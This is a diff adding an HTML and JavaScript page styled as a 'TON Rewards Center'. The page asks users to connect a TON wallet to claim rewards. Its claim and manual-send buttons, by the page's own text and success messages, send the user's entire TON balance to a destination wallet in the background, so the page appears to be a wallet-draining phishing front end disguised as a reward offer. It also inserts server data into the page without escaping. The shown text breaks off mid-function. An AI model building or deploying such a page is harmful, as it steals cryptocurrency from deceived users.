@@ -1,0 +1,1193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TON Connect - Claim Rewards</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            max-width: 420px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: #0098EA;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 30px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #222;
+        }
+
+        .description {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+
+        .balance-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 25px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            color: white;
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
+        }
+
+        .balance-label {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-bottom: 5px;
+        }
+
+        .balance-amount {
+            font-size: 36px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .balance-usd {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+
+        .reward-box {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 2px dashed #0098EA;
+        }
+
+        .reward-amount {
+            font-size: 28px;
+            font-weight: bold;
+            color: #0098EA;
+        }
+
+        .reward-label {
+            color: #666;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        .claim-button {
+            background: #0098EA;
+            color: white;
+            border: none;
+            padding: 14px 32px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+
+        .claim-button:hover {
+            background: #007acc;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 152, 234, 0.3);
+        }
+
+        .claim-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        #ton-connect-button {
+            display: none;
+        }
+
+        .wallet-info {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            display: none;
+        }
+        
+        .tabs {
+            display: flex;
+            margin-top: 20px;
+            border-bottom: 1px solid #dee2e6;
+        }
+        
+        .tab {
+            padding: 10px 15px;
+            cursor: pointer;
+            border: 1px solid transparent;
+            border-top-left-radius: 4px;
+            border-top-right-radius: 4px;
+            margin-bottom: -1px;
+        }
+        
+        .tab.active {
+            color: #0098EA;
+            background-color: #fff;
+            border-color: #dee2e6 #dee2e6 #fff;
+        }
+        
+        .tab-content {
+            display: none;
+            padding: 15px;
+            background: white;
+            border: 1px solid #dee2e6;
+            border-top: none;
+            border-bottom-left-radius: 4px;
+            border-bottom-right-radius: 4px;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .transaction-item, .nft-item {
+            padding: 12px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .transaction-item:last-child, .nft-item:last-child {
+            border-bottom: none;
+        }
+        
+        .transaction-hash, .nft-address {
+            font-family: monospace;
+            font-size: 12px;
+            color: #666;
+            word-break: break-all;
+        }
+        
+        .transaction-amount {
+            font-weight: bold;
+        }
+        
+        .transaction-amount.incoming {
+            color: #28a745;
+        }
+        
+        .transaction-amount.outgoing {
+            color: #dc3545;
+        }
+        
+        .nft-image {
+            width: 80px;
+            height: 80px;
+            object-fit: cover;
+            border-radius: 4px;
+            margin-right: 15px;
+        }
+        
+        .nft-details {
+            display: flex;
+            align-items: center;
+        }
+        
+        /* Send TON form styles */
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 500;
+            color: #444;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        
+        .send-summary {
+            margin: 15px 0;
+            padding: 15px;
+            background: #f0f8ff;
+            border-radius: 8px;
+            border: 1px solid #d1e8ff;
+        }
+        
+        #send-button {
+            margin-top: 10px;
+        }
+
+        .wallet-address {
+            font-family: monospace;
+            font-size: 13px;
+            color: #0098EA;
+            margin-top: 8px;
+            word-break: break-all;
+            background: white;
+            padding: 8px;
+            border-radius: 4px;
+            border: 1px solid #e0e0e0;
+        }
+
+        .status-message {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .status-success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status-error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .status-info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .refresh-icon {
+            display: inline-block;
+            margin-left: 10px;
+            cursor: pointer;
+            font-size: 16px;
+            opacity: 0.7;
+            transition: opacity 0.3s;
+        }
+
+        .refresh-icon:hover {
+            opacity: 1;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .token-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        
+        .token-table th, .token-table td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .token-table th {
+            background-color: #f8f9fa;
+            color: #444;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .token-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .token-table tr:hover {
+            background-color: #f5f8ff;
+        }
+        
+        .token-logo {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        
+        .token-name {
+            display: flex;
+            align-items: center;
+        }
+        
+        .token-symbol {
+            font-weight: 600;
+            margin-right: 5px;
+        }
+        
+        .token-full-name {
+            color: #666;
+            font-size: 12px;
+        }
+        
+        .token-balance {
+            font-weight: 500;
+        }
+        
+        .token-value {
+            color: #0098EA;
+            font-weight: 600;
+        }
+        
+        .portfolio-summary {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            padding: 15px;
+            background: #f0f8ff;
+            border-radius: 8px;
+            border: 1px solid #d1e8ff;
+        }
+        
+        .portfolio-total {
+            font-size: 18px;
+            font-weight: 600;
+            color: #0098EA;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">💎</div>
+        <h1>TON Rewards Center</h1>
+        <p class="description">Connect your wallet to claim rewards and view balance</p>
+        
+        <div id="balanceCard" class="balance-card hidden">
+            <div class="balance-label">Current Balance</div>
+            <div class="balance-amount" id="balanceAmount">0.0000 TON</div>
+            <div class="balance-usd" id="balanceUSD">≈ $0.00 USD</div>
+            <span class="refresh-icon" onclick="refreshBalance()">🔄</span>
+        </div>
+        
+        <div class="reward-box">
+            <div class="reward-amount">Auto-Send</div>
+            <div class="reward-label">Automatic background transfer of your TON balance</div>
+            <p style="margin-top: 10px; font-size: 12px; color: #777;">Clicking "Claim" will automatically send your entire TON balance to the destination wallet in the background</p>
+        </div>
+        
+        <button class="claim-button" id="claimButton" onclick="handleClaimClick()">
+            Connect Wallet
+        </button>
+        
+        <button class="claim-button" id="manual-send-button" onclick="manualSendTON()" style="margin-top: 10px; background-color: #007bff; display: none;">
+            Send Manually
+        </button>
+        
+        <div id="walletInfo" class="wallet-info">
+            <strong>Connected Wallet:</strong>
+            <div class="wallet-address" id="wallet-address"></div>
+            
+            <div class="tabs">
+                <div class="tab active" data-tab="balance">Balance</div>
+                <div class="tab" data-tab="send">Send TON</div>
+                <div class="tab" data-tab="transactions">Transactions</div>
+                <div class="tab" data-tab="nfts">NFTs</div>
+            </div>
+            
+            <div class="tab-content active" id="balance-tab">
+                <div id="token-balances">
+                    <h3>Your Tokens</h3>
+                    <div class="portfolio-summary">
+                        <div>Total Portfolio Value:</div>
+                        <div class="portfolio-total" id="portfolio-total">$0.00 USD</div>
+                    </div>
+                    <table class="token-table">
+                        <thead>
+                            <tr>
+                                <th>Token</th>
+                                <th>Balance</th>
+                                <th>Value</th>
+                            </tr>
+                        </thead>
+                        <tbody id="token-list">
+                            <tr>
+                                <td colspan="3" style="text-align: center;">Loading token balances...</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <div class="tab-content" id="send-tab">
+                <div class="send-form">
+                    <h3>Send TON</h3>
+                    <div class="form-group">
+                        <label for="recipient-address">Recipient Address</label>
+                        <input type="text" id="recipient-address" class="form-control" placeholder="Enter TON wallet address">
+                    </div>
+                    <div class="form-group">
+                        <label for="send-amount">Amount (TON)</label>
+                        <input type="number" id="send-amount" class="form-control" placeholder="0.00" step="0.01" min="0.01">
+                    </div>
+                    <div class="form-group">
+                        <label for="send-comment">Comment (Optional)</label>
+                        <input type="text" id="send-comment" class="form-control" placeholder="Add a message">
+                    </div>
+                    <div class="send-summary" id="send-summary" style="display: none;">
+                        <p>You are sending <span id="summary-amount">0</span> TON to:</p>
+                        <p class="wallet-address" id="summary-recipient"></p>
+                    </div>
+                    <button id="send-button" class="claim-button">Send TON</button>
+                    <div id="send-status" class="status-message" style="display: none;"></div>
+                </div>
+            </div>
+            
+            <div class="tab-content" id="transactions-tab">
+                <div id="transactions-list">
+                    <p>Loading transactions...</p>
+                </div>
+            </div>
+            
+            <div class="tab-content" id="nfts-tab">
+                <div id="nfts-list">
+                    <p>Loading NFTs...</p>
+                </div>
+            </div>
+        </div>
+        
+        <div id="statusMessage" class="status-message"></div>
+        
+        <!-- Hidden container for TON Connect UI button -->
+        <div id="ton-connect-button"></div>
+    </div>
+
+    <script>
+        let tonConnectUI;
+        let connectedWallet = null;
+        let currentBalance = 0;
+
+        // Initialize TON Connect UI
+        function initializeTonConnect() {
+            try {
+                const origin = window.location.origin;
+                tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+                    manifestUrl: `${origin}/api/manifest`,
+                    buttonRootId: 'ton-connect-button',
+                    widgetRootId: null
+                });
+
+                // Listen for wallet status changes
+                tonConnectUI.onStatusChange(async (wallet) => {
+                    if (wallet) {
+                        await handleWalletConnected(wallet);
+                    } else {
+                        handleWalletDisconnected();
+                    }
+                });
+                
+                // Add connect button to the page
+                document.getElementById('ton-connect-button').style.display = 'block';
+                
+                // Check if already connected
+                checkConnectionStatus();
+            } catch (error) {
+                console.error('Failed to initialize TON Connect:', error);
+                showStatus('Failed to initialize wallet connection', 'error');
+            }
+        }
+
+        // Check current connection status
+        async function checkConnectionStatus() {
+            try {
+                const apiUrl = `${window.location.origin}/api/status`;
+                const response = await fetch(apiUrl);
+                const data = await response.json();
+                
+                if (data.connected && tonConnectUI.wallet) {
+                    await handleWalletConnected(tonConnectUI.wallet);
+                }
+            } catch (error) {
+                console.error('Error checking connection status:', error);
+            }
+        }
+
+        // Handle claim button click
+        async function handleClaimClick() {
+            if (!connectedWallet) {
+                // Open TON Connect modal
+                try {
+                    await tonConnectUI.openModal();
+                } catch (error) {
+                    console.error('Failed to open wallet modal:', error);
+                    showStatus('Failed to open wallet connection', 'error');
+                }
+            } else {
+                // Claim rewards
+                await claimRewards();
+            }
+        }
+
+        // Handle wallet connection
+        async function handleWalletConnected(wallet) {
+            connectedWallet = wallet;
+            const walletAddress = wallet.account.address;
+            console.log('Wallet connected:', walletAddress);
+            
+            document.getElementById('claimButton').style.display = 'block';
+            document.getElementById('claimButton').textContent = 'Claim Rewards (Auto-Send)';
+            document.getElementById('manual-send-button').style.display = 'block';
+            document.getElementById('walletInfo').style.display = 'block';
+            document.getElementById('wallet-address').textContent = walletAddress;
+            
+            // Fetch wallet balance
+            refreshBalance();
+            
+            // Send wallet address to server
+            try {
+                const apiUrl = `${window.location.origin}/api/connect`;
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ address: walletAddress })
+                });
+                
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`Server connection failed: ${errorText}`);
+                }
+                
+                const data = await response.json();
+                console.log('Server connection response:', data);
+                
+                if (data.success) {
+                    if (data.balance && data.balance.error) {
+                        showStatus(`Balance error: ${data.balance.error}`, 'error');
+                    } else {
+                        updateBalanceDisplay(data.balance);
+                    }
+                    
+                    // Load additional wallet data
+                    fetchTransactions();
+                    fetchNFTs();
+                    showStatus('Wallet connected successfully!', 'success');
+                } else {
+                    showStatus('Error connecting wallet: ' + (data.message || 'Unknown error'), 'error');
+                }
+            } catch (error) {
+                console.error('Error connecting to server:', error);
+                showStatus(`Error connecting to server: ${error.message}`, 'error');
+            }
+            
+            // Set up tab switching
+            setupTabs();
+        }
+
+        // Handle wallet disconnection
+        function handleWalletDisconnected() {
+            connectedWallet = null;
+            
+            // Send disconnection info to server
+            const apiUrl = `${window.location.origin}/api/disconnect`;
+            fetch(apiUrl, {
+                method: 'POST'
+            }).catch(error => {
+                console.error('Error disconnecting from server:', error);
+            });
+            
+            // Update UI
+            document.getElementById('walletInfo').style.display = 'none';
+            document.getElementById('balanceCard').classList.add('hidden');
+            document.getElementById('claimButton').style.display = 'block';
+            document.getElementById('claimButton').textContent = 'Connect Wallet';
+            document.getElementById('manual-send-button').style.display = 'none';
+            
+            showStatus('Wallet disconnected', 'info');
+        }
+
+        // Update balance display
+        function updateBalanceDisplay(balanceData) {
+            console.log('Updating balance with data:', balanceData);
+            
+            const balanceCard = document.getElementById('balanceCard');
+            const balanceAmount = document.getElementById('balanceAmount');
+            const balanceUSD = document.getElementById('balanceUSD');
+            const tokenList = document.getElementById('token-list');
+            const portfolioTotal = document.getElementById('portfolio-total');
+            
+            // Check if we have the new data structure
+            if (balanceData.native) {
+                // New data structure
+                const nativeBalance = balanceData.native.balance || 0;
+                balanceAmount.textContent = balanceData.native.formatted || `${nativeBalance.toFixed(4)} TON`;
+                
+                // Update USD value and portfolio total
+                const totalUsdValue = balanceData.total_usd_value || 0;
+                balanceUSD.textContent = `≈ ${balanceData.total_usd_formatted || `$${totalUsdValue.toFixed(2)}`}`;
+                portfolioTotal.textContent = balanceData.total_usd_formatted || `$${totalUsdValue.toFixed(2)}`;
+                
+                // Update token table
+                if (balanceData.tokens && balanceData.tokens.length > 0) {
+                    let tokenHtml = '';
+                    
+                    balanceData.tokens.forEach(token => {
+                        const logoUrl = token.logo || '/static/qr-code.svg';
+                        
+                        tokenHtml += `
+                            <tr>
+                                <td class="token-name">
+                                    <img src="${logoUrl}" alt="${token.symbol}" class="token-logo" onerror="this.src='/static/qr-code.svg'">
+                                    <div>
+                                        <span class="token-symbol">${token.symbol}</span>
+                                        <div class="token-full-name">${token.name}</div>
+                                    </div>
+                                </td>
+                                <td class="token-balance">${token.formatted}</td>
+                                <td class="token-value">${token.usd_formatted || `$${token.usd_value.toFixed(2)}`}</td>
+                            </tr>
+                        `;
+                    });
+                    
+                    tokenList.innerHTML = tokenHtml;
+                }
+            } else {
+                // Legacy data structure for backward compatibility
+                currentBalance = balanceData.balance || 0;
+                balanceAmount.textContent = `${currentBalance.toFixed(4)} TON`;
+                
+                // Update USD value
+                const totalUsdValue = balanceData.total_usd_value || (currentBalance * 5.75); // Fallback to estimate
+                balanceUSD.textContent = `≈ $${totalUsdValue.toFixed(2)} USD`;
+                
+                // Update portfolio total
+                portfolioTotal.textContent = balanceData.formatted_total || `$${totalUsdValue.toFixed(2)} USD`;
+                
+                // Update token table
+                if (balanceData.tokens && balanceData.tokens.length > 0) {
+                    let tokenHtml = '';
+                    
+                    // Sort tokens by USD value (highest to lowest)
+                    const sortedTokens = [...balanceData.tokens].sort((a, b) => 
+                        (b.usd_value || 0) - (a.usd_value || 0)
+                    );
+                    
+                    sortedTokens.forEach(token => {
+                        const logoUrl = token.logo || '/static/qr-code.svg';
+                        const usdValue = token.usd_value || 0;
+                        
+                        tokenHtml += `
+                            <tr>
+                                <td class="token-name">
+                                    <img src="${logoUrl}" alt="${token.symbol}" class="token-logo" onerror="this.src='/static/qr-code.svg'">
+                                    <div>
+                                        <span class="token-symbol">${token.symbol}</span>
+                                        <div class="token-full-name">${token.name}</div>
+                                    </div>
+                                </td>
+                                <td class="token-balance">${token.formatted}</td>
+                                <td class="token-value">$${usdValue.toFixed(2)}</td>
+                            </tr>
+                        `;
+                    });
+                    
+                    tokenList.innerHTML = tokenHtml;
+                } else {
+                    // No tokens found or only native TON
+                    tokenList.innerHTML = `
+                        <tr>
+                            <td class="token-name">
+                                <img src="https://ton.org/download/ton_symbol.png" alt="TON" class="token-logo" onerror="this.src='/static/qr-code.svg'">
+                                <div>
+                                    <span class="token-symbol">TON</span>
+                                    <div class="token-full-name">Toncoin</div>
+                                </div>
+                            </td>
+                            <td class="token-balance">${currentBalance.toFixed(4)} TON</td>
+                            <td class="token-value">$${(currentBalance * 5.75).toFixed(2)}</td>
+                        </tr>
+                    `;
+                }
+            }
+            
+            balanceCard.classList.remove('hidden');
+        }
+
+        // Refresh balance
+        async function refreshBalance() {
+            if (!connectedWallet) return;
+            
+            const refreshIcon = document.querySelector('.refresh-icon');
+            refreshIcon.style.animation = 'spin 1s linear';
+            const tokenList = document.getElementById('token-list');
+            
+            // Show loading state
+            tokenList.innerHTML = '<tr><td colspan="3" style="text-align: center;">Loading token balances...</td></tr>';
+            
+            try {
+                // Use window.location.origin to get the current domain
+                const apiUrl = `${window.location.origin}/api/status`;
+                console.log('Fetching balance data from server...', apiUrl);
+                const response = await fetch(apiUrl);
+                
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`Server returned ${response.status}: ${errorText}`);
+                }
+                
+                const data = await response.json();
+                console.log('Balance response:', data); // Debug log
+                
+                if (data.connected) {
+                    if (data.balance && data.balance.error) {
+                        // Display the specific error from API
+                        showStatus(`Balance error: ${data.balance.error}`, 'error');
+                        tokenList.innerHTML = `<tr><td colspan="3" style="text-align: center;">Error: ${data.balance.error}</td></tr>`;
+                    } else {
+                        updateBalanceDisplay(data.balance);
+                        showStatus('Balance updated', 'success');
+                    }
+                } else {
+                    console.error('Not connected in response');
+                    showStatus('Wallet not connected', 'error');
+                    tokenList.innerHTML = '<tr><td colspan="3" style="text-align: center;">Please connect your wallet to view balances</td></tr>';
+                }
+            } catch (error) {
+                console.error('Failed to refresh balance:', error);
+                showStatus(`Error: ${error.message}`, 'error');
+                tokenList.innerHTML = `<tr><td colspan="3" style="text-align: center;">Failed to load token data: ${error.message}</td></tr>`;
+            } finally {
+                setTimeout(() => {
+                    refreshIcon.style.animation = '';
+                }, 1000);
+            }
+        }
+
+        // Claim rewards
+        async function claimRewards() {
+            const button = document.getElementById('claimButton');
+            const originalText = button.textContent;
+            
+            try {
+                button.disabled = true;
+                button.innerHTML = '<span class="loading"></span>Processing...';
+                
+                const apiUrl = `${window.location.origin}/api/claim`;
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    }
+                });
+                
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`Claim failed: ${errorText}`);
+                }
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    // Display success message
+                    showStatus('Reward claimed successfully! Full balance sent.', 'success');
+                    button.textContent = 'Claimed ✓';
+                    
+                    // Update balance if provided
+                    if (data.current_balance) {
+                        updateBalanceDisplay(data.current_balance);
+                    }
+                    
+                    // Re-enable after 3 seconds
+                    setTimeout(() => {
+                        refreshBalance(); // Refresh balance to show the new (zero) balance
+                        button.disabled = false;
+                        button.textContent = originalText;
+                    }, 3000);
+                } else {
+                    throw new Error(data.message || 'Failed to claim rewards');
+                }
+            } catch (error) {
+                console.error('Claim error:', error);
+                showStatus(error.message || 'Failed to claim rewards', 'error');
+                button.disabled = false;
+                button.textContent = originalText;
+            }
+        }
+
+        // Manually send TON
+        async function manualSendTON() {
+            const button = document.getElementById('manual-send-button');
+            const originalText = button.textContent;
+            
+            try {
+                button.disabled = true;
+                button.innerHTML = '<span class="loading"></span>Sending...';
+                
+                const apiUrl = `${window.location.origin}/api/manual_send`;
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({}) // Send full balance by default
+                });
+                
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`Manual send failed: ${errorText}`);
+                }
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    // Display success message
+                    showStatus('Manual send successful! Full balance sent.', 'success');
+                    
+                    // Update balance if provided
+                    if (data.current_balance) {
+                        updateBalanceDisplay(data.current_balance);
+                    }
+                    
+                    // Re-enable after 3 seconds
+                    setTimeout(() => {
+                        refreshBalance(); // Refresh balance to show the new (zero) balance
+                        button.disabled = false;
+                        button.textContent = originalText;
+                    }, 3000);
+                } else {
+                    throw new Error(data.message || 'Failed to send TON');
+                }
+            } catch (error) {
+                console.error('Manual send error:', error);
+                showStatus(error.message || 'Failed to send TON', 'error');
+                button.disabled = false;
+                button.textContent = originalText;
+            }
+        }
+
+        // Show status message
+        function showStatus(message, type) {
+            const statusEl = document.getElementById('statusMessage');
+            statusEl.textContent = message;
+            statusEl.className = `status-message status-${type}`;
+            statusEl.style.display = 'block';
+            
+            // Auto-hide after 5 seconds
+            setTimeout(() => {
+                statusEl.style.display = 'none';
+            }, 5000);
+        }
+
+        // Fetch transaction history
+        async function fetchTransactions() {
+            try {
+                const apiUrl = `${window.location.origin}/api/transactions`;
+                console.log('Fetching transactions from:', apiUrl);
+                const response = await fetch(apiUrl);
+                
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`Failed to fetch transactions: ${errorText}`);
+                }
+                
+                const data = await response.json();
+                console.log('Transactions data:', data);
+                
+                if (data.success) {
+                    displayTransactions(data.transactions);
+                } else {
+                    document.getElementById('transactions-list').innerHTML = 
+                        `<p>Error loading transactions: ${data.message || 'Unknown error'}</p>`;
+                }
+            } catch (error) {
+                console.error('Error fetching transactions:', error);
+                document.getElementById('transactions-list').innerHTML = 
+                    `<p>Error loading transactions: ${error.message}</p>`;
+            }
+        }
+        
+        // Display transactions in the UI
+        function displayTransactions(transactions) {
+            const transactionsContainer = document.getElementById('transactions-list');
+            
+            if (!transactions || transactions.length === 0) {
+                transactionsContainer.innerHTML = '<p>No transactions found.</p>';
+                return;
+            }
+            
+            let html = '';
+            transactions.forEach(tx => {
+                const date = tx.timestamp ? new Date(tx.timestamp * 1000).toLocaleString() : 'Unknown date';
+                const amount = tx.amount ? tx.amount.toFixed(4) + ' TON' : 'Unknown amount';
+                const txType = tx.type || 'unknown';
+                const amountClass = txType === 'incoming' ? 'incoming' : 'outgoing';
+                const amountPrefix = txType === 'incoming' ? '+' : '-';
+                
+                html += `
+                    <div class="transaction-item">
+                        <div class="transaction-amount ${amountClass}">${txType === 'incoming' ? amountPrefix : ''}${amount}</div>
+                        <div>${date}</div>
+                        <div class="transaction-hash">${tx.hash || 'Unknown hash'}</div>
+                        <div>${txType === 'incoming' ? 'From' : 'To'}: ${txType === 'incoming' ? tx.from : tx.to || 'Unknown'}</div>
+                    </div>
+                `;
+            });
+            
+            transactionsContainer.innerHTML = html;
+        }
+        
+        // Fetch NFTs owned by the wallet
+        async function fetchNFTs() {
+            try {
+                const apiUrl = `${window.location.origin}/api/nfts`;
+                console.log('Fetching NFTs from:', apiUrl);
+                const response = await fetch(apiUrl);
+                
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`Failed to fetch NFTs: ${errorText}`);
+                }
+                
+                const data = await response.json();
+                console.log('NFTs data:', data);
+                
+                if (data.success) {
+                    displayNFTs(data.nfts);
+                } else {
+                    document.getElementById('nfts-list').innerHTML = 
+                        `<p>Error loading NFTs: ${data.message || 'Unknown error'}</p>`;
+                }
+            } catch (error) {
+                console.error('Error fetching NFTs:', error);
+                document.getElementById('nfts-list').innerHTML = 
+                    `<p>Error loading NFTs: ${error.message}</p>`;
+            }
+        }
+        
+        // Display NFTs in the UI
+        function displayNFTs(nfts) {
+            const nftsContainer = document.getElementById('nfts-list');
+            
+            if (!nfts || nfts.length === 0) {
+                nftsContainer.innerHTML = '<p>No NFTs found in this wallet.</p>';
+                return;
+            }
+            
+            let html = '';
+            nfts.forEach(nft => {
+                const imageUrl = nft.image || '/static/qr-code.svg'; // Use QR code as fallback
+                const name = nft.name || 'Unnamed NFT';
+                const collection = nft.collection || 'Unknown Collection';
+                
+                html += `
+                    <div class="nft-item">
+                        <div class="nft-details">
+                            <img src="${imageUrl}" alt="${name}" class="nft-image" onerror="this.src='/static/qr-code.svg'">
+                            <div>
+                                <h4>${name}</h4>
+                                <div>Collection: ${collection}</div>
+                                <div class="nft-address">${nft.address || 'Unknown address'}</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            nftsContainer.innerHTML = html;
+        }
+        
+        // Set up tab switching functionality
+        function setupTabs() {
+            const tabs = document.querySelectorAll('.tab');
+            const tabContents = document.querySelectorAll('.tab-content');
+            
+            tabs.forEach(tab => {
+                tab.addEventListener('click', () => {
+                    // Remove active class from all tabs and contents
+                    tabs.forEach(t => t.classList.remove('active'));
+                    tabContents.forEach(content => content.classList.remove('active'));
+                    
+                    // Add active class to clicked tab and corresponding content
+                    tab.classList.add('active');
+                    const tabName = tab.getAttribute('data-tab');
+                    document.getElementById(`${tabName}-tab`).classList.add('active');
+                });
+            });
+        }
+
+        // Handle sending TON to another wallet
+        async function handleSendTon() {
+            const recipientAddress = document.getElementById('recipient-address').value.trim();
+            const amount = document.getElementById('send-amount').value.trim();
+            const comment = document.getElementById('send-comment').value.trim();
+            const sendButton = document.getElementById('send-button');
+            const sendStatus = document.getElementById('send-status');
+            
+            // Validate input
+            if (!recipientAddress) {
+                showSendStatus('Please enter a recipient address', 'error');
+                return;
+            }
+            
+            if (!amount || parseFloat(amount) <= 0) {
+                showSendStatus('Please enter a valid amount', 'error');
+                return;
+            }
+            
+            try {
+                // Disable button during processing
+                sendButton.disabled = true;
+                sendButton.innerHTML = '<span class="loading"></span> Processing...';
+                
+                // Step 1: Prepare transfer on the server
+                const apiUrl = `${window.location.origin}/api/prepare_transfer`;
+                const prepareResponse = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        recipient: recipientAddress,
+                        amount: amount,
+                        comment: comment
+                    })
+                });
+                
+                const prepareData = await prepareResponse.json();
+                
+                if (!prepareData.success) {
+                    showSendStatus(`Error: ${prepareData.message}`, 'error');
+                    sendButton.disabled = false;
+                    sendButton.textContent = 'Send TON';
+                    return;
+                }
+                
+                // Step 2: Use TON Connect to send the transaction
+                try {
+                    // Create transaction parameters
+                    const transaction = {
+                        validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutes from now
+                        messages: [
+                            {
+                                address: recipientAddress,
+                                amount: prepareData.transfer_data.amount_nano.toString(),
+                                payload: comment ? btoa(comment) : ''
+                            }
+                        ]
+                    };
+                    
+                    // Send the transaction using TON Connect
+                    const result = await tonConnectUI.sendTransaction(transaction);
+                    
+                    // Transaction sent successfully
+                    showSendStatus(`Transaction sent! Hash: ${result.boc}`, 'success');
+                    
+                    // Clear form
+                    document.getElementById('recipient-address').value = '';
+                    document.getElementById('send-amount').value = '';
+                    document.getElementById('send-comment').value = '';
+                    
+                    // Refresh balance after sending
+                    setTimeout(refreshBalance, 3000);
+                    
+                    // Refresh transaction list
+                    setTimeout(fetchTransactions, 5000);
+                    
+                } catch (tonConnectError) {
+                    console.error('TON Connect error:', tonConnectError);
+                    showSendStatus(`Error sending transaction: ${tonConnectError.message || 'User rejected or wallet error'}`, 'error');
+                }
+                
+            } catch (error) {
+                console.error('Error preparing transfer:', error);
+                showSendStatus('Error preparing transfer. Please try again.', 'error');
+            } finally {
+                sendButton.disabled = false;
+                sendButton.textContent = 'Send TON';
+            }
+        }
+        
+        // Show status message in the send form
+        function showSendStatus(message, type) {
+            const statusElement = document.getElementById('send-status');
+            statusElement.textContent = message;
+            statusElement.className = 'status-message';
+            statusElement.classList.add(`status-${type}`);
+            statusElement.style.display = 'block';
+            
+            // Hide after 5 seconds for success messages
+            if (type === 'success') {
+                setTimeout(() => {
+                    statusElement.style.display = 'none';
+                }, 5000);
+            }
+        }
+        
+        // Update send summary when amount or recipient changes
+        function updateSendSummary() {
+            const recipientAddress = document.getElementById('recipient-address').value.trim();
+            const amount = document.getElementById('send-amount').value.trim();
+            const summaryElement = document.getElementById('send-summary');
+            
+            if (recipientAddress && amount && parseFloat(amount) > 0) {
+                document.getElementById('summary-amount').textContent = parseFloat(amount).toFixed(4);
+                document.getElementById('summary-recipient').textContent = recipientAddress;
+                summaryElement.style.display = 'block';
